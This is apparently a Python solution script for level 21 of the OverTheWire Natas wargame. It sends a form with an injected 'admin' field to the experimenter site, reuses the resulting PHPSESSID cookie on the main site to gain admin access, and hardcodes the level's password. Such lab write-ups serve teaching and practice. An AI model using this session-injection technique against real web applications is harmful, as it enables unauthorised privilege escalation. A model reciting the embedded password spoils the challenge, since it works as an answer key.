import requests


# Credentials for natas21
username = "natas21"
password = "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH"

# Target URL
url = "http://natas21.natas.labs.overthewire.org"
exp_url = "http://natas21-experimenter.natas.labs.overthewire.org?debug"


# Payload we will submit to the experimenter page.
payload = {
    "align": "right",
    "fontsize": "300",
    "bgcolor": "blue",
    "admin": "1",
    "submit": "Update"
}

# Start a session to persist cookies and headers across requests
session = requests.Session()

print("="*80)
print(" "*30, "Experimenter Debug Page")
print("="*80)

# send POST request to the experimenter page
post_response = session.post(
    exp_url,
    data=payload,
    auth=(username, password)
)

# extract admin cookie from experimenter page
admin_cookie = session.cookies["PHPSESSID"]
# print experiementer page response
print(post_response.text)
print(admin_cookie)

print("="*80)
print(" "*30, "Natas21 Main Page")
print("="*80)


# perform a GET request to the main natas21 page with admin_cookie
get_response = session.get(
    url,
    cookies = {"PHPSESSID": admin_cookie},
    auth=(username, password)
)

# Print the HTML from the main page response
print(get_response.text)
print("="*80)
